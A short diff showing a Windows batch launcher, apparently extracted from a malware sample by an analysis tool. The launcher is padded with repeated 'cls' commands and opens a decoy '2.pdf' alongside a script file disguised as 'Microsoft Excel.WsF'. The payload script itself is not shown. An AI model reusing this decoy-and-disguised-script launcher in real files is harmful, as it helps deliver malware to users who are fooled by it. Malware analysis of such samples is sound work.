@@ -1,1 +1,2 @@
+REM Batch extracted by Characterize
 cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&start 2.pdf&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&start Microsoft" "Excel.WsF&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&cls&exit
